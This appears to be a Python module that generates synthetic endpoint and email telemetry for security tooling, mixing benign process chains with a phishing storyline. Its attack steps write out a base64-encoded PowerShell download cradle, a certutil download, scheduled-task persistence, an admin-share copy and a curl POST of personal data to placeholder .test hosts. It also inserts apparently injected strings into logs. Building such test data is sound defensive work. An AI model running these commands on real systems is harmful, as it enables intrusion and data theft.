"""A small, consistent world behind the synthetic exports: devices, users and
binaries that keep their attributes across rows and tables, process trees in
time order, and one attack storyline mixed into benign activity.

The generator asks `Context.resolve(column)` first; columns the world doesn't
model fall back to the per-column rules in generator.py.
"""
from __future__ import annotations

import base64
import hashlib
import random
from dataclasses import dataclass, field
from datetime import datetime, timedelta

from .values import Faker, ascii_name

# Binary catalogue: name -> (folder, signer, company, product, size bytes).
# Sizes are typical for Windows 11 23H2 builds (rounded; not exact).
SYS32 = r"C:\Windows\System32"
BINARIES = {
    "explorer.exe": (r"C:\Windows", "Microsoft Windows", "Microsoft Corporation", "Microsoft® Windows® Operating System", 5_500_000),
    "svchost.exe": (SYS32, "Microsoft Windows Publisher", "Microsoft Corporation", "Microsoft® Windows® Operating System", 57_000),
    "wininit.exe": (SYS32, "Microsoft Windows Publisher", "Microsoft Corporation", "Microsoft® Windows® Operating System", 450_000),
    "userinit.exe": (SYS32, "Microsoft Windows", "Microsoft Corporation", "Microsoft® Windows® Operating System", 30_000),
    "services.exe": (SYS32, "Microsoft Windows Publisher", "Microsoft Corporation", "Microsoft® Windows® Operating System", 730_000),
    "cmd.exe": (SYS32, "Microsoft Windows", "Microsoft Corporation", "Microsoft® Windows® Operating System", 323_000),
    "powershell.exe": (SYS32 + r"\WindowsPowerShell\v1.0", "Microsoft Windows", "Microsoft Corporation", "Microsoft® Windows® Operating System", 455_000),
    "rundll32.exe": (SYS32, "Microsoft Windows", "Microsoft Corporation", "Microsoft® Windows® Operating System", 71_000),
    "certutil.exe": (SYS32, "Microsoft Windows", "Microsoft Corporation", "Microsoft® Windows® Operating System", 1_560_000),
    "schtasks.exe": (SYS32, "Microsoft Windows", "Microsoft Corporation", "Microsoft® Windows® Operating System", 235_000),
    "net.exe": (SYS32, "Microsoft Windows", "Microsoft Corporation", "Microsoft® Windows® Operating System", 59_000),
    "whoami.exe": (SYS32, "Microsoft Windows", "Microsoft Corporation", "Microsoft® Windows® Operating System", 74_000),
    "curl.exe": (SYS32, "Microsoft Windows", "Microsoft Corporation", "Microsoft® Windows® Operating System", 570_000),
    "wmic.exe": (SYS32 + r"\wbem", "Microsoft Windows", "Microsoft Corporation", "Microsoft® Windows® Operating System", 515_000),
    "taskhostw.exe": (SYS32, "Microsoft Windows", "Microsoft Corporation", "Microsoft® Windows® Operating System", 101_000),
    "msedge.exe": (r"C:\Program Files (x86)\Microsoft\Edge\Application", "Microsoft Corporation", "Microsoft Corporation", "Microsoft Edge", 4_200_000),
    "outlook.exe": (r"C:\Program Files\Microsoft Office\root\Office16", "Microsoft Corporation", "Microsoft Corporation", "Microsoft Outlook", 43_000_000),
    "winword.exe": (r"C:\Program Files\Microsoft Office\root\Office16", "Microsoft Corporation", "Microsoft Corporation", "Microsoft Word", 2_100_000),
    "teams.exe": (r"C:\Program Files\WindowsApps\MSTeams", "Microsoft Corporation", "Microsoft Corporation", "Microsoft Teams", 1_800_000),
    "chrome.exe": (r"C:\Program Files\Google\Chrome\Application", "Google LLC", "Google LLC", "Google Chrome", 3_000_000),
}
BENIGN_CHAINS = [  # (parent, child, command line template)
    ("explorer.exe", "outlook.exe", '"outlook.exe"'),
    ("explorer.exe", "msedge.exe", '"msedge.exe" --profile-directory=Default'),
    ("explorer.exe", "teams.exe", '"teams.exe"'),
    ("services.exe", "svchost.exe", "svchost.exe -k netsvcs -p -s Schedule"),
    ("svchost.exe", "taskhostw.exe", "taskhostw.exe"),
    ("explorer.exe", "chrome.exe", '"chrome.exe"'),
    ("explorer.exe", "winword.exe", '"WINWORD.EXE" /n'),
]
PORTS = {"https": 443, "http": 80, "smb": 445, "rdp": 3389, "winrm": 5985, "ldap": 389, "dns": 53, "ssh": 22}


def fake_hashes(key: str) -> tuple[str, str, str]:
    h = hashlib.sha256(key.encode()).hexdigest()
    return hashlib.sha1(key.encode()).hexdigest(), h, hashlib.md5(key.encode()).hexdigest()  # noqa: S324 (fake ids)


@dataclass
class User:
    first: str
    last: str
    sam: str
    upn: str
    sid: str
    object_id: str
    netbios: str


SYSTEM_USER = User("", "", "system", "", "S-1-5-18", "", "NT AUTHORITY")


@dataclass
class Device:
    name: str
    device_id: str
    ip: str
    os: str
    users: list[User] = field(default_factory=list)
    report_id: int = 0
    pid: int = 1000


@dataclass
class Proc:
    name: str
    folder: str
    signer: str
    company: str
    product: str
    size: int
    sha1: str
    sha256: str
    md5: str
    cmd: str
    pid: int
    created: datetime
    user: User | None


class World:
    def __init__(self, fake: Faker, rng: random.Random, devices: int = 12, users: int = 20,
                 injections: bool = True):
        self.f, self.rng, self.injections = fake, rng, injections
        self.company = fake.company()
        fake.primary = self.company
        _, slug, cc = self.company
        self.netbios = fake.mark("domain", slug.upper()[:15])
        self.mail_domain = fake.mark("domain", f"{slug}-{cc}.example")
        self.ad_domain = fake.mark("domain", f"corp.{slug}-{cc}.example")
        self.tenant = fake.tenant_id()
        self.users = [self._user() for _ in range(users)]
        self.devices = [self._device(i) for i in range(devices)]
        self.victims = rng.sample(self.devices, k=max(2, devices // 4))
        self.c2 = [f"cdn-{fake.hex(4)}.test", f"login-{fake.hex(3)}.test"]
        self.attacker_ips = [f"198.51.100.{rng.randint(1, 254)}" for _ in range(3)]
        self.dc_ip = fake.mark("ip_private", f"10.0.0.{rng.randint(2, 20)}")
        # victim device -> (steps, user, start); each step has a fixed time
        # offset, so the same event lines up across tables.
        self.story: dict[str, tuple[list, User, datetime]] = {}
        self.story_pos: dict[tuple[str, str], int] = {}  # (table, victim) -> next step

    def _user(self) -> User:
        first, last = self.f.person()
        sam = self.f.mark("account", f"{ascii_name(first)}.{ascii_name(last)}")
        self.f.mark("person_name", f"{first} {last}")
        return User(first, last, sam, self.f.mark("upn", f"{sam}@{self.mail_domain}"),
                    self.f.sid(), self.f.object_id(), self.netbios)

    def _device(self, i: int) -> Device:
        kind = self.rng.choice(["LT", "LT", "WS", "SRV"])
        name = self.f.mark("device", f"{self.company[1][:3]}-{kind.lower()}-{i:04d}.{self.ad_domain}")
        ip = self.f.mark("ip_private", f"10.{self.rng.randint(0, 3)}.{self.rng.randint(0, 255)}.{self.rng.randint(2, 254)}")
        d = Device(name, self.f.device_id(), ip,
                   "WindowsServer2022" if kind == "SRV" else self.rng.choice(["Windows11", "Windows10"]))
        d.users = self.rng.sample(self.users, k=1 if kind != "SRV" else 3)
        return d

    def proc(self, dev: Device, name: str, cmd: str, created: datetime, user: User | None,
             folder: str | None = None) -> Proc:
        dev.pid += self.rng.randint(4, 400)
        if name in BINARIES and not folder:
            fol, signer, company, product, size = BINARIES[name]
            size += self.rng.randint(-2000, 2000)
        else:  # dropped or downloaded: unsigned, in a user folder
            fol = folder or self.f.user_path().rsplit("\\", 0)[0]
            signer = company = product = ""
            size = self.rng.randint(40_000, 2_500_000)
        sha1, sha256, md5 = fake_hashes(f"{fol}\\{name}")
        return Proc(name, fol, signer, company, product, size, sha1, sha256, md5, cmd,
                    dev.pid, created, user)


@dataclass
class Context:
    """Everything one synthetic row is about."""
    world: World
    device: Device
    user: User
    ts: datetime
    proc: Proc
    parent: Proc
    grandparent: Proc
    report_id: int
    remote_ip: str = ""
    remote_port: int = 0
    remote_url: str = ""
    action: str = ""
    malicious: bool = False

    def resolve(self, col: str):
        """Value for a column the world models, else None."""
        w, f, d, u, p, pp, gp = self.world, self.world.f, self.device, self.user, self.proc, self.parent, self.grandparent
        iso = lambda t: t.strftime("%Y-%m-%dT%H:%M:%S.%f") + "0Z"  # noqa: E731
        acct0 = p.user or SYSTEM_USER
        simple = {
            "Timestamp": iso(self.ts),
            "DeviceName": d.name, "DeviceId": d.device_id, "OSPlatform": d.os,
            "MachineGroup": f"{w.company[1]}-{'servers' if 'Server' in d.os else 'clients'}",
            "ReportId": self.report_id, "TenantId": w.tenant,
            "AccountName": acct0.sam, "AccountDomain": acct0.netbios, "AccountSid": acct0.sid,
            "AccountUpn": acct0.upn, "AccountObjectId": acct0.object_id,
            "AccountDisplayName": f"{acct0.first} {acct0.last}".strip(),
            "LocalIP": d.ip, "LocalIPType": "Private", "LocalPort": self.world.rng.randint(49152, 65535),
            "ActionType": self.action or None,
        }
        if col in simple and simple[col] is not None:
            return simple[col]
        for prefix, pr in (("InitiatingProcessParent", gp), ("InitiatingProcess", pp), ("Process", p), ("", p)):
            if col.startswith(prefix):
                rest = col[len(prefix):]
                acct = pr.user or SYSTEM_USER
                vals = {
                    "FileName": pr.name, "FolderPath": f"{pr.folder}\\{pr.name}", "SHA1": pr.sha1,
                    "SHA256": pr.sha256, "MD5": pr.md5, "FileSize": pr.size, "CommandLine": pr.cmd,
                    "ProcessCommandLine": pr.cmd, "Id": pr.pid, "ProcessId": pr.pid,
                    "CreationTime": iso(pr.created), "ProcessCreationTime": iso(pr.created),
                    "VersionInfoCompanyName": pr.company, "VersionInfoProductName": pr.product,
                    "VersionInfoOriginalFileName": pr.name, "VersionInfoInternalFileName": pr.name.rsplit(".", 1)[0],
                    "VersionInfoFileDescription": pr.product,
                    "VersionInfoProductVersion": "10.0.22631.4460" if pr.signer.startswith("Microsoft Windows")
                    else ("131.0.2903.86" if pr.signer else ""),
                    "VersionInfoFileVersion": "10.0.22631.4460" if pr.signer.startswith("Microsoft Windows") else "",
                    "VersionInfoProductVersion_": "",
                    "UniqueId": pr.pid * 1000 + 17, "SessionId": 0 if pr.user is None else 1,
                    "SignatureStatus": "Valid" if pr.signer else "Unsigned",
                    "SignerType": "OsVendor" if pr.signer.startswith("Microsoft Windows") else ("ThirdParty" if pr.signer else "None"),
                    "AccountName": acct.sam, "AccountDomain": acct.netbios, "AccountSid": acct.sid,
                    "AccountUpn": acct.upn, "AccountObjectId": acct.object_id,
                    "IntegrityLevel": "System" if pr.user is None else "Medium",
                    "TokenElevation": "TokenElevationTypeDefault",
                    "LogonId": 999 if pr.user is None else 0x3E7 + w.rng.randint(1, 9999),
                }
                if prefix == "" and col in ("FileName", "FolderPath", "SHA1", "SHA256", "MD5", "FileSize") \
                        and not col.startswith("Process") and self.action.startswith("File"):
                    continue  # DeviceFileEvents: the file, not the process (handled below)
                if rest in vals:
                    return vals[rest]
        if col == "RemoteIP":
            return self.remote_ip
        if col == "RemoteIPType":
            if not self.remote_ip:
                return ""
            return "Private" if self.remote_ip.startswith(("10.", "192.168.", "172.")) else "Public"
        if col == "RemotePort":
            return self.remote_port or ""
        if col == "RemoteUrl":
            return self.remote_url
        if col == "Protocol":
            return "Udp" if self.remote_port == 53 else "Tcp"
        if col in ("IsInitiatingProcessRemoteSession", "IsProcessRemoteSession"):
            return False
        if col in ("InitiatingProcessRemoteSessionDeviceName", "InitiatingProcessRemoteSessionIP",
                   "ProcessRemoteSessionDeviceName", "ProcessRemoteSessionIP", "AppGuardContainerId"):
            return ""
        if col == "CreatedProcessSessionId":
            return 1
        if col == "AdditionalFields" and self.action in ("ProcessCreated", "ConnectionSuccess", "ConnectionFailed",
                                                          "InboundConnectionAccepted", "ConnectionRequest",
                                                          "ListeningConnectionCreated"):
            return ""
        return None


# --- scenario -------------------------------------------------------------------

NETWORK_ACTIONS = ["ConnectionSuccess", "ConnectionSuccess", "ConnectionSuccess", "ConnectionFailed",
                   "InboundConnectionAccepted", "ConnectionRequest"]
LURES = ["Lönespec november", "Faktura {n}", "Uppdaterade bankuppgifter", "Utbetalning {iban}",
         "Delad fil: Lönespec_{first}_{last}.docm"]


def _enc(script: str) -> str:
    """PowerShell -EncodedCommand: Base64 of UTF-16LE."""
    return base64.b64encode(script.encode("utf-16-le")).decode()


def _attack_steps(w: World, d: Device, u: User):
    """The storyline on a victim device: (parent, child, command, network, offset).

    offset: seconds after the storyline start (when the lure is opened)."""
    f = w.f
    c2 = w.rng.choice(w.c2)
    lure = f"Lönespec_{u.first}_{u.last}_{w.rng.randint(2024, 2026)}.docm"
    f.mark("file_pii", lure)
    temp = f"C:\\Users\\{u.sam}\\AppData\\Local\\Temp"
    target = w.rng.choice([x for x in w.devices if x is not d] or [d])
    steps = [
        ("outlook.exe", "winword.exe", f'"WINWORD.EXE" /n "C:\\Users\\{u.sam}\\Downloads\\{lure}"', None),
        ("winword.exe", "powershell.exe",
         "powershell.exe -nop -w hidden -enc "
         + _enc(f"IEX (New-Object Net.WebClient).DownloadString('https://{c2}/s/{f.hex(6)}')"), (c2, 443)),
        ("powershell.exe", "certutil.exe", f"certutil.exe -urlcache -f http://{c2}/dl/{f.hex(12)}.php {temp}\\a.exe", (c2, 80)),
        ("powershell.exe", "a.exe", f'"{temp}\\a.exe"', (c2, 443)),
        ("powershell.exe", "net.exe", f"net user {u.sam} /domain", (w.ad_domain, 389)),
        ("powershell.exe", "schtasks.exe",
         f'schtasks /create /tn "Update" /tr "C:\\Users\\{u.sam}\\Documents\\upd.ps1" /sc hourly /ru {u.netbios}\\{u.sam}', None),
        ("powershell.exe", "cmd.exe", f'cmd.exe /c copy "{temp}\\a.exe" \\\\{target.ip}\\c$\\temp', (target.ip, 445)),
        ("a.exe", "curl.exe", f'curl.exe -d "pnr={f.national_id()}&tel={f.phone()}" https://{c2}/gate', (c2, 443)),
        ("powershell.exe", "powershell.exe",
         f'powershell.exe Send-MailMessage -To {f.email()} -Subject "Utbetalning {f.iban()}"', ("smtp." + w.mail_domain, 587)),
    ]
    if w.injections:
        steps.append(("cmd.exe", "powershell.exe", f'powershell.exe -c "Write-Host \'{w.rng.choice(INJECTIONS)}\'"', None))
    t, out = 0, []
    for s in steps:
        out.append((*s, t))
        t += w.rng.randint(20, 400)
    return out


from .values import INJECTIONS  # noqa: E402


# Who starts whom: parent -> grandparent, and which processes run as SYSTEM.
GRANDPARENT = {"explorer.exe": "userinit.exe", "services.exe": "wininit.exe", "svchost.exe": "services.exe"}
SYSTEM_PROCS = {"wininit.exe", "services.exe", "svchost.exe"}
# Benign network per process: (host, port); "dc" is the domain controller.
BENIGN_NET = {
    "outlook.exe": [("outlook.office365.com", 443)],
    "teams.exe": [("teams.microsoft.com", 443)],
    "msedge.exe": [("login.microsoftonline.com", 443), ("www.bing.com", 443)],
    "chrome.exe": [("www.google.com", 443)],
    "svchost.exe": [("dc", 53), ("dc", 389), ("dc", 88), ("windowsupdate.com", 443)],
}


def make_context(w: World, table: str, actions: list[str], ts: datetime, report_id: int) -> Context:
    rng = w.rng
    net_table = "RemoteIP" in table or table == "DeviceNetworkEvents"
    malicious = rng.random() < 0.25
    d = rng.choice(w.victims if malicious else w.devices)
    u = rng.choice(d.users)
    step = None
    if malicious:
        # Each table walks the victim's storyline once, in order; every step
        # has a fixed time, so tables agree. The lure mail comes first.
        if d.name not in w.story:
            w.story[d.name] = (_attack_steps(w, d, u), u, ts)
        steps, u, start = w.story[d.name]
        i = w.story_pos.get((table, d.name), 0)
        limit = 1 if table.startswith("Email") else len(steps)
        if i < limit:
            w.story_pos[(table, d.name)] = i + 1
            step = steps[i]
            ts = start - timedelta(seconds=rng.randint(180, 1200)) if table.startswith("Email") \
                else start + timedelta(seconds=step[4], microseconds=rng.randint(0, 999999))
        else:
            malicious = False
            d = rng.choice(w.devices)
            u = rng.choice(d.users)
    if step:
        parent_name, child_name, cmd, net, _ = step
    else:
        chains = [c for c in BENIGN_CHAINS if c[1] in BENIGN_NET] if net_table else BENIGN_CHAINS
        parent_name, child_name, cmd = rng.choice(chains)
        net = rng.choice(BENIGN_NET[child_name]) if child_name in BENIGN_NET and (net_table or rng.random() < 0.5) else None
        if net_table and rng.random() < 0.15:
            net = None
    if net_table and not net:  # a listening socket: a SYSTEM service
        parent_name, child_name, cmd = "services.exe", "svchost.exe", "svchost.exe -k netsvcs -p"
    boot = ts - timedelta(hours=rng.randint(2, 48))
    gp_name = GRANDPARENT.get(parent_name, "explorer.exe")
    gp = w.proc(d, gp_name, gp_name, boot, None if gp_name in SYSTEM_PROCS | {"userinit.exe"} else u)
    p_folder = f"C:\\Users\\{u.sam}\\AppData\\Local\\Temp" if parent_name == "a.exe" else None
    parent = w.proc(d, parent_name, f'"{parent_name}"', ts - timedelta(minutes=rng.randint(1, 90)),
                    None if parent_name in SYSTEM_PROCS else u, p_folder)
    child = w.proc(d, child_name, cmd, ts - timedelta(seconds=rng.randint(0, 30)),
                   None if child_name in SYSTEM_PROCS and parent_name in SYSTEM_PROCS else u,
                   f"C:\\Users\\{u.sam}\\AppData\\Local\\Temp" if child_name == "a.exe" else None)
    remote_ip, remote_port, remote_url = "", 0, ""
    if net:
        host, port = net
        remote_port = port
        if host == "dc" or host == w.ad_domain:
            remote_ip = w.dc_ip
        elif host.startswith("10."):
            remote_ip = host
        elif host.endswith(".test"):
            remote_ip = rng.choice(w.attacker_ips)
            remote_url = host
        elif host.endswith(".example"):
            remote_ip = w.f.mark("ip_customer", f"203.0.113.{rng.randint(1, 254)}")
            remote_url = host
        else:
            remote_ip = f"192.0.2.{rng.randint(1, 254)}"
            remote_url = host
    action = rng.choice(actions) if actions else ""
    if table == "DeviceProcessEvents":
        action = "ProcessCreated"
    elif table == "DeviceNetworkEvents":
        action = rng.choice(NETWORK_ACTIONS[:4]) if remote_ip else "ListeningConnectionCreated"
    if net_table:
        # Network rows: the connecting process is the initiating process.
        return Context(w, d, u, ts, child, child, parent, report_id, remote_ip, remote_port, remote_url,
                       action, malicious)
    return Context(w, d, u, ts, child, parent, gp, report_id, remote_ip, remote_port, remote_url, action, malicious)


def email_value(w: World, ctx: Context, col: str):
    """Email tables: one message per row, senders and recipients from the world."""
    f, u = w.f, ctx.user
    if not hasattr(ctx, "_mail"):
        if ctx.malicious:
            sender = f.mark("email", f"{w.rng.choice(['payroll', 'ekonomi', 'it-support'])}@{w.rng.choice(w.c2)}")
            subject = w.rng.choice(LURES[:1] + LURES[4:]).format(n=w.rng.randint(1000, 9999), iban=f.iban(), first=u.first, last=u.last)
            if "{first}" in subject or "Lönespec_" in subject:
                f.mark("file_pii", subject.split(": ", 1)[-1])
            if w.injections and w.rng.random() < 0.1:
                subject = w.rng.choice(INJECTIONS)
        else:
            other = w.rng.choice(w.users)
            sender = other.upn
            subject = w.rng.choice(["Veckomöte", "Re: Budget Q4", "Lunch?", "Projektstatus", "Fwd: Avtal"])
        ctx._mail = {"sender": sender, "subject": subject, "id": f.uuid()}
    m = ctx._mail
    sender_domain = m["sender"].split("@", 1)[1]
    vals = {
        "SenderFromAddress": m["sender"], "SenderMailFromAddress": m["sender"],
        "SenderFromDomain": sender_domain, "SenderMailFromDomain": sender_domain,
        "SenderDisplayName": m["sender"].split("@")[0],
        "RecipientEmailAddress": u.upn, "RecipientObjectId": u.object_id,
        "Subject": m["subject"], "NetworkMessageId": m["id"],
        "EmailDirection": "Inbound" if ctx.malicious else "Intra-org",
        "DeliveryAction": "Delivered", "DeliveryLocation": "Inbox/folder",
        "SenderIPv4": w.rng.choice(w.attacker_ips) if ctx.malicious else "",  # intra-org: no external hop
        "SenderIPv6": "",
        "InternetMessageId": f"<{m['id'][:18]}@{sender_domain}>",
        "ThreatTypes": "Phish" if ctx.malicious else "",
        "ThreatNames": "", "DetectionMethods": "", "Cc": "", "Context": "", "AdditionalFields": "",
        "AuthenticationDetails": '{"SPF":"pass","DKIM":"pass","DMARC":"pass"}' if not ctx.malicious
        else '{"SPF":"fail","DKIM":"none","DMARC":"fail"}',
        "OrgLevelAction": "", "UserLevelAction": "", "OrgLevelPolicy": "", "UserLevelPolicy": "",
        "AttachmentCount": 1 if ctx.malicious else 0, "UrlCount": 1 if ctx.malicious else 0,
        "ConfidenceLevel": '{"Phish":"High"}' if ctx.malicious else "",
    }
    return vals.get(col)
